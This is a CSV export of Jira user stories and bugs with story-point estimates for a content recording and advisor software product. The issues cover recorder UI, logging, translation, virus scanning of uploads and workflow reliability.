issuekey,title,description,storypoint
REB-4990,Book Reviewer - load content in background,"As a user, viewing a book, content (items in the ""Select Content"" container) should begin loading in the background when the book loads, before I go to that specific Select Content container.For example, if my book ""A"" has three items in ""Select Content"" containers, 1, 2, and 3, which are in the Table of Contents in that order (call them Select Content 1, Select Content 2, Select Content 3). When I open the book in the Book Reviewer, I typically start with the Introduction. Select Content 1, 2, and 3 should start loading in the background. AC:* Individual pieces of content begin loading on page load* API requests for content should be made in the order content appears in the table of contents ",5
REB-4989,Content Manager - Capture Desktop Context Tool - Process Names,"As a user, capturing context using the Capture Desktop Context Tool, process names for content in web browsers should be 'SPECIALBROWSER', not the names of the individual browsers: !capture_context_browsers.jpg|thumbnail! Found this issue on Stage in the Sprint 64 build, may need more testing.",1
REB-4987,"All Advisor and Recorder Apps - Show the ""logged out"" icon when the app is not logged in","As a user of ALL the apps in the system, whenever a user downloads the app initially OR when they manually log out, the user has the icon that appears that you are logged in: !image-2019-03-26-13-56-07-565.png|thumbnail! However, we need to update this process.  If a user downloads the app manually and has NOT logged in yet OR if they log out manually, we need to see these icons: !image-2019-03-26-13-55-55-069.png|thumbnail! This will need to be consistent for ALL Web and Desktop Apps.",3
REB-4986,Web Advisor - Add option to update the context for Advisor immediately,"As a user of the Web Advisor, I want to be able to ""refresh"" the context for recently published/unpublished content.  Currently, we have to login/logout for this to occur.  Add a button to the settings page (left of play/pause icon). Use the same icon size/style. Add ""Update Context"" as the hover label.  Here is the icon: https://materialdesignicons.com/icon/refresh !screenshot-1.png|thumbnail! ",2
REB-4985,Desktop Advisor - Add option to update the context for Advisor immediately,"As a user of the Desktop Advisor, I want to be able to ""refresh"" the context for recently published/unpublished content.  Currently, we have to either wait for the time in ""Context Data Update Interval"" to occur OR we need to login/logout.  Add a button to the settings page to ""Update Now"" (use the same button style on that page): !image-2019-03-26-13-48-00-810.png|thumbnail! ",2
REB-4984,Desktop Advisor should have local logs,"As a user of desktop advisor application I want to be able to see logs being generated on my computer so that I can investigate issues that happen while I'm using the application.Acceptance Criteria* For the desktop advisor logs will need to be put locally on the users file system in addition to log repository(greylog)* All Error level logs should be logged to the local log at all times* A setting via the application settings page should be used to enable/disable Debug level logging additionally* Log files should be configured for max file size, max \# of log files to retain, and log rotating* Debug level logs will be added to the application* * Update ACs in 4/15/2019:** Error logs will always be sent to log file and graylogs** Debug logs will only be sent to log file and graylogs when the setting is enabled",8
REB-4982,Default Eula - allow Epilogue Admin to remove a single account from the Default Eula,"As an Epilogue Admin, I want to be able to remove one or more accounts from the Default Eula so that the account users do not have to agree to it anymore. This is because I may want them to see ONLY a custom Eula that I have created and associated to their account. Currently, there is no way to remove an account from the default EULA.* Allow the Default Eula to be edited just like any custom Eula so that an account, country, etc can be removed* Because it's possible to have NO Eula, we need to account for this case. If there is no Eula selected for the account, they'll see no dialog at login and would use the system as normal",5
REB-4980,Content Manager - don't allow users to clone items with no data,"As a power user, with a 'Version 0.0' parent selected, I should not have the option to 'clone' the parent because there is no data attached.Obviously if the parent were a later version there would be data attached so I should still be able to clone it.*Expected* In QA / Stage / Production the Clone option shouldn't show up. Also, there's no options other than 'Delete' and 'Information' so the 'More' icon should not show up either.*Actual* in Production the Clone option is still showing up (in the right-click menu and the top menu) when you have a parent with no data selected.Also, in QA / Stage the 'More' icon is showing up, AND if you click on it you get a line (which I assume is the empty menu): !more_options.jpg|thumbnail! I'm putting this in as a Production Bug, since the most important issue is that the 'clone' options are still showing up in Production, but there's work to be done in the current build as well. Thanks!",1
REB-4977,Remove the label text for Dynamic field in Viewer/PDF,"Labels Included when they should not beCurrently, for all of the ""Standard"" and Custom Metadata, Dynamic fields include the label along with the field information. It MUST be the field information only that is displayed in the Viewer and PDFs \- Please review this carefully. We found this issue in all static and simulation content types (other than eAssistant \- see below).!image-2019-03-25-21-26-07-474.png|thumbnail! !image-2019-03-25-21-26-49-026.png|thumbnail! Note: all attributes still shows as tags in Editor, so please not change for it.",3
REB-4975,Web Recorder - Auto Pause recording following REB-4974,"Following the enhancement in REB-4974, we need to ensure we are only capturing the stream when the user is actively recording their application. If they do not interact with the recorder for a long time, we don't want to continue to capture video during this time. Instead, we should alert them and auto-pause their recording.* After 4974 is implemented, if no action has been captured for 1 minute during a web recording session, we should auto-pause the recording. This should be just like clicking Pause on the recording.** When the recording is auto-paused, the stream capture should also be paused* Immediately after the recording is auto-paused, display a Desktop Notification to inform the user:""Are you still there? Your recording session has been paused due to inactivity.""* The user may open the extension and manually resume the recording by clicking ""Resume"" as normal. The stream should resume capturing at this time.",3
REB-4974,Web Recorder - Update Capture method to ensure image accuracy,"As an user with recording permissions, I need to be able to capture the image at the exact time that I take an action on a website. Currently, if I begin clicking very quickly on a site, Chrome cannot keep up with the image capture. This may result in images captured that are no longer accurate (ie. when chrome took the pictures, the user has already moved to a different area).To account for this, we need to change the capture method to ensure accuracy.* Update the Web Recorder to use the Chrome Desktop Capture fulltime (for all actions).* Instead of capturing an image at the time of each action, we should be capturing a Stream of the full session as video** Video frame rate should be very low since we do not need motion. We should start at 10 frames per second.* The recorder, instead of capturing the image, should capture the time in the stream that each action was done (click, select, etc) in order to process after recording is complete.* Once recording is complete, process the stream locally and slice the image for each step at the time code indicated.* Once the image is sliced for each step, upload the image as normal and discard the stream** Log any errors with stream processing and include details about what failed",8
REB-4973,Recording API - Handle all cases of bad data to ensure recording isn't lost on Desktop Recorder,"Following REB-4929, we need to add appropriate logic to ensure that we are checking and accounting for ANY value we are not expecting for ANY field sent to the API. I should not be able to submit the recording to the API and have it fail.* Implement logic and checks for recording data prior to submitting to the API to ensure there are no values that will cause the recording to fail* Any time we catch and correct an issue to ensure it can be processed, we need to log this with what was corrected, the value before and the value after.",3
REB-4972,Update AWS Lambda Functions - .NET Core 2.1,"AWS informed us that they will no longer support updates to functions on .NET Core 2.0. We need to update our code to 2.1:{panel:title=AWS Email}Your AWS Account currently has one or more Lambda functions using the .NET Core 2.0 runtime. Microsoft has published that .NET Core 2.0 was declared End-of-Life (EOL) on October 1 2018 [1], and has stopped receiving bug fixes, security updates, or performance improvements. Per the AWS Lambda runtime support policy [2], language runtimes that have reached their EOL are deprecated in AWS Lambda.Invokes for functions configured to run on .NET Core 2.0 will continue to work normally, however the ability to create new Lambda functions configured to use the .NET Core 2.0 runtime will be disabled on April 30 2019. Code updates to existing functions using .NET Core 2.0 will be disabled 30 days later on May 30 2019.We encourage you to update all your functions to the newer available runtime version (.NET Core 2.1) so that you continue to benefit from important security, performance, and functionality enhancements offered by more recent releases. The newer .NET Core 2.1 version has improved C# & Powershell support, along with other language and API improvements. The AWS Lambda programming model [3] for .NET Core 2.1 maintains backwards compatibility with previous versions to simplify portability. We recommend that you test your Lambda function to validate its behavior on the newer version of .NET Core.{panel}* Update Lambda functions to comply with AWS",3
REB-4971,Update AWS Lambda Functions - Node.js 8.10,"AWS informed us that they will no longer support updates to functions on Node.js 6.10. We need to update our code to 8.10:{panel:title=AWS Email}Your AWS Account currently has one or more Lambda functions using the node.js 6.10 runtime. The Node Foundation has previously published that node.js 6.x ""Boron"" will be declared End-of-Life (EOL) on April 2019 [1], and will stop receiving bug fixes, security updates, or performance improvements. Per the AWS Lambda runtime support policy [2], language runtimes that have reached their EOL are deprecated in AWS Lambda.Invokes for functions configured to run on node.js 6.10 will continue to work normally, however the ability to create new Lambda functions configured to use the node.js 6.10 runtime will be disabled on April 30 2019. Code updates to existing functions using node.js 6.10 will be disabled 30 days later on May 30 2019We encourage you to update your node.js 6.10 functions to a newer version of the Node runtime (node.js 8.10) so that you continue to benefit from important security, performance, and functionality enhancements offered by more recent releases. The newer node.js 8.10 version has improved ECMAScript support, along with other language and API improvements. The AWS Lambda programming model [3] for node.js 8.10 maintains backwards compatibility with previous versions to simplify portability. We recommend that you test your Lambda function to validate its behavior on the newer version of Node.js.{panel}* Update Lambda functions to comply with AWS",3
REB-4970,Desktop Recorder - Adjust UI like Web Recorder - Pending Upload Screen,"As any user with recording permission, the Web Recorder and the Desktop Recorder should work and look almost identical so that my User experience is not different between the 2 apps. We should update the Desktop Recorder with the SAME UI and function that was already applied for the Web Recorder.* When a recording is completed, but the images are still uploading, the user needs a screen where they can go to see what recording are still processing. This should work exactly as the Web Recorder.** Add icon for the Pending upload screen between the Content Manager and the Settings icon. Use the same icon as web recorder** Clicking this icon should go to a simple screen where I can see any pending uploads. Clicking each upload will navigate to the recording completion screen, just like Web Recorder!screenshot-1.png|width=200,height=183!** If there are no pending uploads, display the same message as in the web recorder** pending uploads need to be retained locally EVEN if the application is closed. When reopened, pending uploads should resume to complete the recording. No recording data should be lost.",8
REB-4968,Desktop Recorder - Adjust UI like Web Recorder - Recording Flow,"As any user with recording permission, the Web Recorder and the Desktop Recorder should work and look almost identical so that my User experience is not different between the 2 apps. We should update the Desktop Recorder with the SAME UI and function that was already applied for the Web Recorder.* When a recording is started, Adjust the UI and UX to match the Web recorder** Update pre-recording review screen: !screenshot-1.png|thumbnail! ** Update recording control screen !screenshot-2.png|thumbnail!** Update recording process to show upload progress exactly like Web Recorder** On ""Stop"" add the recording completion screen to desktop recorder. This should work exactly like the Web Recorder. !screenshot-3.png|thumbnail! ** ",13
REB-4967,Desktop Recorder - Adjust UI like Web Recorder,"As any user with recording permission, the Web Recorder and the Desktop Recorder should work and look almost identical so that my User experience is not different between the 2 apps. We should update the Desktop Recorder with the SAME UI and function that was already applied for the Web Recorder.* Adjust Task and Content Manger UI to match style of the Web recorder",5
REB-4950,[PLACEHOLDER] Content Editor add/edit step element titles,"As an epilogue user in the content editor, I should be able to add titles to any step. ",1
REB-4948,Book Manager - Delete All Items should include all attached items - Investigation,"As a Power User, in the Book Manager, if I delete a book with items attached, I'm prompted to delete those items also.*Expected* if there are items attached to a book in Linked Content, Selected Content, or in any other way, if they are not attached to another book, if I choose to 'Delete Items' when I delete that book, they will all be deleted.*Actual* associated HTML and PNG files are not being removed. This may be the case with other associated files as well, I only found it with these files.You can test with this .odarc file: [^EPOS_UPK_OPUS.odarc] STR:1. Import .odarc file2. Delete the book generated by that file, choose to delete itemsIt will leave behind a lot of HTML and PNG files.",1
REB-4947,Better message for Document does not exist error,"As a content creatorI want a more descriptive message when I try to access a document that does not exist so that i am more informed of the reason I can't access a document. Currently the user normally sees a generic error and the log says ""Object reference is not set to an instance of an object""A user encounters this when after completing a recording where uploading the recording fails the user then attempts to access that document and is currently presented with a generic error message.AC* Display error message ""No content exists for this document or task.""",1
REB-4942,Desktop recorder should have local logs,"* For the desktop recorder logs will additionally need to be put locally on the users file system* All Error level logs should be logged locally at all times* A setting via the application settings page should be used to enable/disable Debug level logging additionally* Log files should be configured for max file size, max # of log files to retain, and log rotating",5
REB-4941,Gray log should add the Ip address,"•	Need to know where the log is being generated from(Desktop Recorder, Web recorder, Web App, web advisor, desktop advisor.)•	Log the IP address so we can identify any issues based on with geolocation",8
REB-4940,Improve logger - v2\BuildingBlocks\BuildingBlockService.cs,"- Add try/catch- Add more param to log to make it more clear (do not add sensitive data such as password, key, ...)- Remove un-useful logs- Following coding standard from Sonar- make sure we use right type: Debug or Error",1
REB-4938,Improve logger - v2\Books\BookManagerAppService.cs,"- Add try/catch- Add more param to log to make it more clear (do not add sensitive data such as password, key, ...)- Remove un-useful logs- Following coding standard from Sonar- make sure we use right type: Debug or Error",1
REB-4937,Improve logger - v2\Books\BookBranchAppService.cs,"- Add try/catch- Add more param to log to make it more clear (do not add sensitive data such as password, key, ...)- Remove un-useful logs- Following coding standard from Sonar- make sure we use right type: Debug or Error",1
REB-4936,Improve Logging -v2\Documents\DocumentIOAppService.cs,"* Add try/catch* Add more param to log to make it more clear (do not add sensitive data such as password, key, ...)* Remove un-useful logs* Following coding standard from Sonar* make sure we use right type: Debug or Error",1
REB-4935,Improve logging - v2\Documents\DocumentAppService.cs,"* Add try/catch* Add more param to log to make it more clear (do not add sensitive data such as password, key, ...)* Remove un-useful logs* Following coding standard from Sonar* make sure we use right type: Debug or Error",1
REB-4931,BE - UT Opus.v2.Partners.PartnersAppService (19%),Target: 30%,1
REB-4930,Language - Simultaneous edits to Step elements,"As an Ep Admin or a translator, for all areas of the site that we can modify the translations for global elements (Step Elements, Application Language, HTML Elements), I need the ability to have 2 users edit the same element at the same time, but in 2 different languages.Currently, 2 users can edit at the same time, but the last change committed will overwrite the previous one, so it's possible to overwrite a users language changes.* When a user is editing an element, it should ONLY update the one language they have changed.** Currently it will update every language even if it did not change* Following the item above, 2 users editing the same element at the same time should be able to edit different languages without overwriting each other's changes.* If 2 users edit the same element AND the same language at the same time, then normal logic would apply and the last change would overwrite the previous.",5
REB-4929,Web/Desktop Recorder - Resolve issue with coordinates resulting in lost recording,"As a recorder in PROD, the client has run into an issue with a small sub-set of users where they complete the recording, but when they go to edit it, the recording no longer exists (meaning, there is no document in the branch). The recording was lost between being completed on the client and being processed by the server.Here are some error messages that show the same basic thing, ""Object reference is not an instance of an object""[~accountid:557058:296e7719-bc31-44fd-bbe8-881189084f8b] Did some more looking and found a trace-ID that indicates that the exception occured because the users recording had at least one step with: Error converting value ""1076, 722, NaN, NaN"" to type 'System.Drawing.Rectangle'See this traceID: ""0HLLBRR5HJS0H:00000008""* We need to resolve the issue on the client side (ie. in each recorder app) so that ""NaN"" is never passed to the API. If the coordinate cannot be captured, we should just default it to ""0"" so that it does not fail and will still be processed by the backend.Note: We are not yet sure of the root cause of the issue and most people cannot reproduce this issue, but some users have the problem (might be video driver, etc). We should resolve the symptom above as a hot-fix to ensure the recordings are not lost.",3
REB-4928,User Management - Copy invitation URL,"As a Customer Admin, I need to be able to manually copy the Invitation URL directly from the user management page for each user in case that user cannot access their email for some reason.* Add a new button to each user in the user management table to allow the admin to click and copy the same invitation URL that included in the email (icon TBD)Note: User would then paste this or send this URL directly to the use so they can verify the account without having to receive the email.",3
REB-4920,Desktop Recorder - Application partially off screen - Investigate,"Client feedback:If you record on the Desktop Recorder and your application is partially off the screen, the results will be anomalous.Sometimes the part of the window off the screen will be replaced with a black rectangle, sometimes the actual window will be displaced to the upper left.1. take recycle bin or any window and position it partially off the screen (so the window isn't totally covered by the screen)2. Record in Desktop Recorder and try clicking in various positions around the window. You'll get some interesting results.This issue was originally found by a customer that was recording an application 'full screen' on Production, so please test with an application that way as well. Thanks! !screenshot-1.png|thumbnail!  [^Desktop Recording 2-12 V0.5.opsx] * Adjust desktop capture to account for this case",5
REB-4919,Recorder - Multiple Monitors - Calculate based on scale of individual monitor - investigation,"As any user with recording permission, currently if I record on a multi monitor system and my scale on each monitor is different, the images captures will be incorrect because it is using the scale of the primary monitor for calculation.* Get the scale of each monitor individually and calculate the screen capture so that images and control area are correct even if monitors are different scale.Note from the client: ""We are still having a problem with customers with two monitors, one set to a display percentage other than 100%, and recording on the second ends up with misplaced control areas because the scaling is following the display percentage from the primary monitor. We need each monitor to scale depending on that monitor's display percentage.""",5
REB-4915,Bulk Publish - I should receive only 1 notification for all documents,"As a customer admin or power user, if I choose to bulk publish MANY items at one time, I am currently getting 1 notification ""New Content was published to your Library"" for each document in my bulk publish. This is obviously very distracting to the user.* When a user bulk publishes documents, they should see 1 notification AFTER all documents are published instead of 1 notification for each document.",1
REB-4914,Step Editor - don't show field table in 'all docs' content type if disabled,"As an Editor, working on content in the Editor in an account where the field tables are disabled, if I am looking at the 'all docs' content type, I shouldn't see a field table for 'type' steps.I should only see field tables in steps that call for them if a) they are turned on in at least one content type in the current customer account and b) I am currently viewing the 'all docs' content type or a content type that has them turned onIf all field tables are disabled for the current customer account: !Field Table - Disabled.png|thumbnail! *Expected:* I *never *see field tables - not in any content type in the Viewer, not in a PDF, and not in the Editor.*Actual:* I see field tables in the Editor when I work in the 'all docs' content type.",1
REB-4907,Issue Caching ApplicationSettings data,"Currently We used Entity to caching, so we have error as below in graylog and log fileNewtonsoft.Json.JsonSerializationException: Self referencing loop detected for property 'Locale' with type 'Opus.Authoring.Locale'. Path '[0].Locale.Actions[0]'.   at Newtonsoft.Json.Serialization.JsonSerializerInternalWriter.CheckForCircularReference(JsonWriter writer, Object value, JsonProperty property, JsonContract contract, JsonContainerContract containerContract, JsonProperty containerProperty)We will need to convert to DTO before caching object or ignore referencing loop",3
REB-4871,Move recorder position on recording Start,"As a user with recording permission, when I begin a desktop recording, I want the small recording window to be moved by default to the top right corner of my screen so it's not in the way of the window I want to record.* When the recording is started, move the small recorder window to the top right corner of the screen automatically** This is needed so that the client does not have to manually move the window out of the way so that it is not captured when clicking on the the screen",1
REB-4866,"Translation issue - When editing HTML Elements, it's translating for ALL locales","As a Customer Admin, if I am editing my HTML elements (headers, footer, title, etc), when I save my changes, it appears that it is attempting to translate the element into EVERY language in the Opus application instead of ONLY the language I have on my account.* We need to ensure that translations are only done for NEW elements OR when adding a language to the account** Existing elements already have the base translation and may have been edited specifically for that language, so we don't want to re-translate and overwrite any changes* Ensure that when a translation is done, it is ONLY for those language on the account, NOT all languages in the application** Since each account has it's own library of these HTML elements, they should only have translations for the languages on their account.Note: We need to be very careful anytime we call the translation API so that we are ONLY translating what is needed. Currently we are seeing large numbers of characters translated that are not needed.",5
REB-4862,Desktop Recorder performance - investigate high CPU percentage used by rebus.recorder process,"As a recorder, using the Desktop Recorder to record, the rebus.recorder process will go as high as 35% of my total CPU when I begin recording.In addition, it stays at a high percentage of CPU throughout recording and even after the recording has finished and has been sent to the Editor and the Editor window is open with the recording results. It doesn't relinquish its high use of CPU until the Desktop Recorder is closed.We need to investigate why we are using so much of the CPU for this process and see if we can reduce it, it is impairing the use of the applications we are recording, as well as slowing down the interface.* Investigate high CPU usage of the desktop recorder** Rename process “opus” rather than rebus. There should be no mention of rebus.* Detail the purpose of each process generated (currently around 5 processes are spawned)** If we can reduce the number of processes, we should do so.* Provide detailed solution to the issue or fix it directly if the points allow.",2
REB-4860,HTML Element - Inactivate Default elements in the account,"As a Customer Admin, I need to be able to inactive that default ""Elements"" used in my recordings if I don't want them to appear. For example, I don't want the standard header added to my document when it is recorded. Currently, I have no way to turn them off.* Add a ""remove"" icon to each default element in the HTML Element Library* If the ""X"" is clicked, it should ""inactivate"" the element** When inactive the element should be greyed out in the left column of the HTML Element Library** Inactive elements should have the re-active icon in place of the ""x"" icon. This is exactly like when removing a step element from a recording.** Admin should still be able to make a copy or change it in any way* Inactive element will NOT be added to recordings and should NOT appear in the left menu of the editor. !image-2019-03-15-13-57-01-791.png|thumbnail!  !image-2019-03-15-13-58-01-077.png|thumbnail! ",8
REB-4855,Desktop Recorder - Closing Internet Explorer,"As a recorder, recording a step using the desktop recorder where I am closing the Internet Explorer browser, the recorder doesn't capture the whole screen, just the close menu: !IE box issue.png|thumbnail! * Resolve issue causing it to not capture the whole window.** See investigation feedback below:""As Tai Nguyen Huu's comment, I have checked the code, in some applications such as Calculator, Microsoft edge,... That Engine would detect ""title bar"" with control type is window, so Engine would get ""title bar"" instead of ""whole app"" to capture. That is root cause, App Recorder couldn't capture the whole screen. We can fix this issue.""",3
REB-4854,Target Applications - Advisor Match Count and Content Titles,"As an Epilogue Admin, I want to know if the ""Target Application"" context also triggers an ""Advisor Match"" for  my users metadata.  For example, if my users metadata triggers an Advisor match to pop AND that same context matches the Target Applications context that is setup for the account, I want to reflect the matching information in the JSON produced (for the Data Lake):*Acceptance Criteria:** Create two additional fields in the Target Application JSON below ""targetAppPlatform"":** *AdvisorMatchCount* (numeric) - This will be how many Advisor matches were triggered by the Target Application Context** *ContentTitles* (alphanumeric) - Display the titles of the content that matched, in an array* If there are two Advisor matches, then two titles must be listed* If there are no advisor matches, display ""0"" and leave the titles blank",5
REB-4851,"Customize Format - Add new ""Fork Path Colors"" option and misc UI Changes","Currently, when we add a fork element to a recording and then view the document, we now have a color bar on the left side so we can easily see the collective fork path.  As a Customer Admin, I need the ability to select the Fork Path Colors for my site.  There are also some changes to the UI so please see how the Fork Path Color will look and where it will be located in the AC:*Acceptance Criteria:** Double the padding between the ""Select Theme"" drop down and the ""Customize Theme"" header* Double the padding between the bottom of the ""Upload Custom Format' box and the ""Document Font Format"" header* Reduce the white space between the ""Customize Theme"" header and the ""Main Accent Color"" box.  Similar to the spacing of ""Document Font Format"" header and the ""Step title"" row* Create a new ""Additional Document Format"" section below the ""Step note instruction"" row (use same font, color, space, etc. defined above)* Within the new ""Additional Document Format"" section, move the following rows below it:** Step Control Number** Control image highlight** Fork path colors:1. Label - ""Fork path colors""2. To the right of the label, add four color boxes and four labels evenly spaced like all other selection fields above - Path 1, Path 2, Path 3, Path 43. Default all 4 colors to the ""Main Accent Color"" for each theme - If the ""Main Accent Color"" is white, make them the ""Header Font Color""4. In the preview section, add a bar to the left of ""step 1"" just like we do for preview - adjust spacing to be accurate to the content preview screen - The color will change with the color in the ""Path 1"" box.",8
REB-4850,Build Web Apps for EU Deployment,"As part of the deployment to EU, we need to ensure that there are web apps for recorder and advisor built.  Unfortunately, there is not a lot of documentation regarding how to setup a separate instance of the builds.The request is to build both the recorder and advisor web apps for the EU deployment.Expected results:Recorder and Advisor web apps built pointing to the EU Opus instanceBonus Points:Full documentation on how to build web apps for different environments.Notes:The following is the information for the EU deployment.  The naming follows the similar structure, opuseps.eu instead of opuseps.comURL: opuseps.eusocketio: opuseps.internal.opuseps.eu",1
REB-4849,Epilogue / Customer Admin functions - Invite User - Email greater than 50 characters,"As a Customer Admin or Epilogue Admin, I need to know there is a maximum length for an email address when performing Invite User action.Currently, the maximum length for email address notification is not presented until the invitee completes registration and attempts to login. That is way too late. It needs to happen when the Admin is inviting new users, on the Invite User screen.Steps to reproduce1) Login as Customer Admin    Account - TLF_STAGE    User - tfernbaugh+tlf_stageaccount@epiloguesystems.com2) Navigate to Invite User form3) Complete user information and click Invite User    Email - tfernbaugh+stagecontentuserAgreaterthanfiftycharacters@epiloguesystems.com   4) From email invite click ""Log in to Epilogue Systems"" link5) Complete registration and click COMPLETE6) Enter user credentialsExpected behavior - user is logged into Opus Customer AccountActual behavior - ""Email Address is too long. It should have 50 characters or less."" message displaysWe need to add Javascript validation to the Invite User screen which checks the length of the Email address and presents error message and prevents the user invite if it is over 50 characters.This validation should be added for both the Epilogue Admin Invite User screen and the Customer Admin Invite User screen.",1
REB-4848,Remove ERS servers - Regression Test and Upgrade Path,"Following REB-4132, we need to fully regression test the new update method to ensure it doesn't introduce any new bugs and that users with the previous app can correctly upgrade to get on the new release.* Fully regression test new Desktop Recorder and Advisor and resolve any bugs** Find solution to remove black borders** New method for logout on uninstall* Ensure we have a clear upgrade path so that users with transition seamlessly to this new build and update approach WITHOUT having to manually uninstall and reinstall.",8
REB-4843,Desktop Applications - Integrated Windows Authentication,"As an SSO user, connecting to my SSO account using the Desktop applications, they pass through a request to the authentication service every time.However, in some desktop environments, they use what's called ""Integrated Windows Authentication"" - all applications on their system are automatically authenticated with no need to resolve a request each time.We need to investigate whether it's possible to detect if IWA is running in a local environment, and if so, use the local credentials to accomplish authentication rather than requiring a pass through and a fresh prompt each time.",5
REB-4842,Hide cursor in Web Recorder Capture,"After investigating the solution to this issue, we need to follow the Web API spec at the following URL to hide the input (cursor) when we are using the full desktop capture:https://developer.mozilla.org/en-US/docs/Web/API/MediaTrackConstraints/cursor03/13: Currently chrome doesn't support this yet.",2
REB-4841,Web Recorder UI - Rearrange Step List,"As any user with recorder permission, I want to see my list of steps with step 1 on the top and the latest step on the bottom.* Flip the step list in the new Web Recorder UI, so that Step 1 is at the top and the most recent step is on the bottom* The scroll should work so the most recent step is always in view (ie. scrollbar always scrolled to the bottom). !image-2019-03-13-14-24-02-360.png|thumbnail! ",2
REB-4839,Clam AV - Scan uploads directly to a task,"Following REB-4456, we need to apply the same logic to for when a user imports and item directly to a task (ie. creating a task or clicking or clicking the action to choose an item to import within the task)* When a user chooses to import an item directly to a task either by creating a new task and choosing the import action or overwriting content by choosing the import action within the task, apply the same Clam AV scanning of that file** Display appropriate status just like with the existing import process (ie. Verifying)** Update ""Verifying"" status text to ""Scanning"" everywhere this is shown. !image-2019-03-13-13-16-09-558.png|thumbnail!  !image-2019-03-13-13-15-19-663.png|thumbnail! ",13
REB-4838,Logging - Object reference not set to an instance of an object,"We frequently see this error in graylog, usually associated with completing a recording, ex:1. Create recording and hit stop2. Verify number of steps and click ""Edit Recording""3. Instead of loading the editor, we see an error.This type of error message in Graylog is too generic and is not descriptive enough to tell us what happened or allow us to take action on the error.traceid:0HLL6I0NQR1SF\:00000006 on 03/12* Find all instances of this generic error and add more verbose logging here to allow us to track down and resolve the cause of the issue.** Where did the error come from (desktop recorder, web recorder)** Log needs to be readable so we have an idea what happened and any possible impact to the client (ie. Recording no longer exists)* If a cause is identified when adding logging, create story in jira to resolve the root cause of the issue and assign it to the logging epic !image-2019-03-13-11-42-00-755.png|thumbnail! ",3
REB-4833,Completing Recordings - Provide better UX when editor is waiting on items to upload - Editor page,"As a user with permission to record, if I attempt to open the editor before all the assets are uploaded, I get a dialog that looks like an error. This is a very bad user experience. We need to present the user with a status of their recording so that they know when it's ready.* When the recording is processing in the background, use the ""loading"" animation to tell the user what is happening** Use the generic loading bar with a message ""Processing Recording""* As soon as the steps are ready for the recording, the editor should be loaded even if all the images are not yet present.** For each step that is still waiting on an image to be uploaded, display the loading wheel (like we do in the web recorder) next to that step.** When the image is successfully uploaded, display it as normal in the step and remove the loading wheel.",8
REB-4828,Logging and Messaging - Top 10 Graylog items,"As any user of the application, when the system encounters and error, I need to see a more friendly error message that gives me any idea what happened.* Find the top 10 most frequent errors in Graylog* Ensure we have verbose logging for each one of these so that we have enough information to fix the root cause of the issue and that the log is readable.* Create a new story to address the root cause of each error* Provide the basic cause of the error and we'll provide updated error messaging to display to the user for that error.",8
REB-4823,Workflow - Transaction checks - Publishing Task or Document,"As any user with access to the workflow or ability to publish, there should be no action I can take that will cause a task or document to be orphaned or inaccessible. We need to add transaction checks to each part of the workflow process to ensure that ALL parts of the process are completed successfully before we write any changes.Currently, we are seeing instances where a document might be published, but closing the task resulted in an error. This means we have an orphaned task without any content (since it's been published) and this will throw an error each time and cannot be deleted.* Ensure we have checks in place to ensure the entire flow is completed successfully before applying those changes. If one part fails, the whole operation should fail and log an error:** When publishing a task from a project (and merging document version)** When publishing a document in content manager** If the whole process fails, display an error message and write a log to graylog with enough detail to be actionable.",13
REB-4822,Workflow - Transaction checks - Moving between workflow states,"As any user with access to the workflow or ability to publish, there should be no action I can take that will cause a task or document to be orphaned or inaccessible. We need to add transaction checks to each part of the workflow process to ensure that ALL parts of the process are completed successfully before we write any changes.Currently, we are seeing instances where a document might be published, but closing the task resulted in an error. This means we have an orphaned task without any content (since it's been published) and this will throw an error each time and cannot be deleted.* Ensure we have checks in place to ensure the entire flow is completed successfully before applying those changes. If one part fails, the whole operation should fail and log an error:** When moving a task between workflow states** If the whole process fails, display an error message “There was a problem changing the state of your task. Please try again or contact support.” and write a log to graylog with enough detail to be actionable.",5
REB-4821,Workflow - Transaction checks - Adding Content to a Document or Task,"As any user with access to the workflow or ability to publish, there should be no action I can take that will cause a task or document to be orphaned or inaccessible. We need to add transaction checks to each part of the workflow process to ensure that ALL parts of the process are completed successfully before we write any changes.Currently, we are seeing instances where a document might be published, but closing the task resulted in an error. This means we have an orphaned task without any content (since it's been published) and this will throw an error each time and cannot be deleted.* Ensure we have checks in place to ensure the entire flow is completed successfully before applying those changes. If one part fails, the whole operation should fail and log an error:** When recording to a new task or document** When uploading content to a task or document (import, file upload, etc)** If the whole process fails, display an error message and write a log to graylog with enough detail to be actionable.",13
